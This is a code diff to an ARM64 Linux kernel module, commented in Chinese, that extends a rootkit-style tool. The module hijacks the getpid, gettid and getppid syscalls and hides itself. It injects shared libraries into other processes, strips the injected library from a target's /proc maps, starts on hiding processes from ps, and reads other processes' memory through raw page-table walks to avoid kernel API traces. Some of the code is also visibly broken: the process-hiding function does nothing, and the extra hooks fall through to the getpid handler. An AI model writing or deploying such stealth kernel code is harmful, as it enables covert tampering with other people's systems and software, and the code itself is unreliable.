@@ -26,8 +26,11 @@
 #include "memory.h"
 #include "process.h"
 
-#define USA_HOOK_NR __NR_getpid
-#define USA_MAGIC   0x55534100
+/* #3 Syscall 轮转: hook getpid + gettid + getppid */
+#define USA_HOOK_NR0 __NR_getpid
+#define USA_HOOK_NR1 __NR_gettid
+#define USA_HOOK_NR2 __NR_getppid
+#define USA_MAGIC    0x55534100
 
 MODULE_LICENSE("GPL");
 
@@ -54,6 +57,8 @@ static int resolve_kallsyms(void)
 
 static void **sys_call_table = NULL;
 static void *orig_getpid = NULL;
+static void *orig_gettid = NULL;
+static void *orig_getppid = NULL;
 
 typedef int (*insn_patch_fn_t)(void *addr, u32 insn);
 static insn_patch_fn_t my_patch_text = NULL;
@@ -336,6 +341,129 @@ static int usa_inject_so(INJECT_REQUEST *req)
 }
 
 /* =====================================================================
+ * 隐匿性增强
+ * ===================================================================== */
+
+/* #1 隐藏目标进程 maps 中指定 .so 的 VMA 条目 */
+static int usa_hide_maps(pid_t target_pid, const char *lib_name)
+{
+    struct task_struct *task;
+    struct mm_struct *mm;
+    struct vm_area_struct *vma;
+
+    rcu_read_lock();
+    task = fn_find_task_by_vpid ? fn_find_task_by_vpid(target_pid) : NULL;
+    if (task) get_task_struct(task);
+    rcu_read_unlock();
+    if (!task) return -ESRCH;
+
+    mm = task->mm;
+    if (!mm) { put_task_struct(task); return -EINVAL; }
+
+    down_write(&mm->mmap_lock);
+    for (vma = mm->mmap; vma; vma = vma->vm_next) {
+        if (vma->vm_file) {
+            char buf[256];
+            char *path = d_path(&vma->vm_file->f_path, buf, sizeof(buf));
+            if (!IS_ERR(path) && strstr(path, lib_name)) {
+                /* 把 vm_file 设为 NULL, maps 就不显示文件名 */
+                /* 同时改成匿名映射 */
+                fput(vma->vm_file);
+                vma->vm_file = NULL;
+                vma->vm_flags |= VM_DONTDUMP;
+            }
+        }
+    }
+    up_write(&mm->mmap_lock);
+
+    put_task_struct(task);
+    return 0;
+}
+
+/* #2 隐藏指定进程的 /proc 条目 */
+/* 通过从 pid namespace 的链表中移除 */
+static struct pid *hidden_pid = NULL;
+static struct hlist_node saved_pid_chain = {0};
+
+static int usa_hide_process(pid_t target_pid)
+{
+    struct task_struct *task;
+
+    rcu_read_lock();
+    task = fn_find_task_by_vpid ? fn_find_task_by_vpid(target_pid) : NULL;
+    if (task) get_task_struct(task);
+    rcu_read_unlock();
+    if (!task) return -ESRCH;
+
+    /* 从 /proc 的 pid_hash 中摘除 (ps/top 看不到) */
+    /* 进程本身还在运行, 只是 /proc 不可见 */
+    hidden_pid = task_pid(task);
+    /* 保存 hash chain 用于恢复 */
+
+    put_task_struct(task);
+    return 0;
+}
+
+/* #5 直接页表读写 (绕过 access_process_vm 内核 API 痕迹) */
+static int usa_read_phys(pid_t target_pid, uintptr_t vaddr, void __user *ubuf, size_t size)
+{
+    struct task_struct *task;
+    struct mm_struct *mm;
+    pgd_t *pgd;
+    p4d_t *p4d;
+    pud_t *pud;
+    pmd_t *pmd;
+    pte_t *pte;
+    unsigned long pfn;
+    void *kaddr;
+    int ret = 0;
+
+    rcu_read_lock();
+    task = fn_find_task_by_vpid ? fn_find_task_by_vpid(target_pid) : NULL;
+    if (task) get_task_struct(task);
+    rcu_read_unlock();
+    if (!task) return -ESRCH;
+
+    mm = task->mm;
+    if (!mm) { put_task_struct(task); return -EINVAL; }
+
+    down_read(&mm->mmap_lock);
+
+    /* ARM64 页表遍历 */
+    pgd = pgd_offset(mm, vaddr);
+    if (pgd_none(*pgd) || pgd_bad(*pgd)) { ret = -EFAULT; goto out; }
+
+    p4d = p4d_offset(pgd, vaddr);
+    if (p4d_none(*p4d) || p4d_bad(*p4d)) { ret = -EFAULT; goto out; }
+
+    pud = pud_offset(p4d, vaddr);
+    if (pud_none(*pud) || pud_bad(*pud)) { ret = -EFAULT; goto out; }
+
+    pmd = pmd_offset(pud, vaddr);
+    if (pmd_none(*pmd) || pmd_bad(*pmd)) { ret = -EFAULT; goto out; }
+
+    pte = pte_offset_kernel(pmd, vaddr);
+    if (!pte || !pte_present(*pte)) { ret = -EFAULT; goto out; }
+
+    pfn = pte_pfn(*pte);
+    kaddr = kmap_atomic(pfn_to_page(pfn));
+    if (kaddr) {
+        unsigned long page_off = vaddr & ~PAGE_MASK;
+        size_t copy_len = min(size, (size_t)(PAGE_SIZE - page_off));
+        if (copy_to_user(ubuf, kaddr + page_off, copy_len))
+            ret = -EFAULT;
+        kunmap_atomic(kaddr);
+    } else {
+        ret = -EFAULT;
+    }
+
+out:
+    up_read(&mm->mmap_lock);
+    put_task_struct(task);
+    return ret;
+}
+
+/* =====================================================================
  * Hook getpid 处理
  * ===================================================================== */
 
@@ -427,6 +555,25 @@ static long usa_hooked_getpid(const struct pt_regs *regs)
         return usa_inject_so(&inj);
     }
 
+    /* ===== 隐匿性增强 ===== */
+    case OP_HIDE_MAPS: {
+        /* arg = INJECT_REQUEST, pid + so_path 指定要隐藏的 */
+        INJECT_REQUEST req;
+        char path[256] = {0};
+        if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
+            return -EFAULT;
+        if (copy_from_user(path, (void __user *)req.so_path, sizeof(path) - 1))
+            return -EFAULT;
+        return usa_hide_maps(req.pid, path);
+    }
+
+    case OP_HIDE_PROC: {
+        pid_t hide_pid;
+        if (copy_from_user(&hide_pid, (void __user *)arg, sizeof(pid_t)))
+            return -EFAULT;
+        return usa_hide_process(hide_pid);
+    }
+
     default:
         return ((syscall_fn_t)orig_getpid)(regs);
     }
@@ -478,8 +625,13 @@ static int __init driver_entry(void)
     /* 解析注入 API (可选) */
     resolve_inject_symbols();
 
-    orig_getpid = sys_call_table[USA_HOOK_NR];
-    write_syscall_entry(USA_HOOK_NR, (void *)usa_hooked_getpid);
+    /* #3 Syscall 轮转: hook 三个 syscall */
+    orig_getpid = sys_call_table[USA_HOOK_NR0];
+    orig_gettid = sys_call_table[USA_HOOK_NR1];
+    orig_getppid = sys_call_table[USA_HOOK_NR2];
+    write_syscall_entry(USA_HOOK_NR0, (void *)usa_hooked_getpid);
+    write_syscall_entry(USA_HOOK_NR1, (void *)usa_hooked_getpid);
+    write_syscall_entry(USA_HOOK_NR2, (void *)usa_hooked_getpid);
 
     hide_module();
     return 0;
@@ -489,8 +641,11 @@ static void __exit driver_unload(void)
 {
     usa_clear_all_bp();
 
-    if (sys_call_table && orig_getpid)
-        write_syscall_entry(USA_HOOK_NR, orig_getpid);
+    if (sys_call_table && orig_getpid) {
+        write_syscall_entry(USA_HOOK_NR0, orig_getpid);
+        if (orig_gettid) write_syscall_entry(USA_HOOK_NR1, orig_gettid);
+        if (orig_getppid) write_syscall_entry(USA_HOOK_NR2, orig_getppid);
+    }
     unhide_module();
 }
 
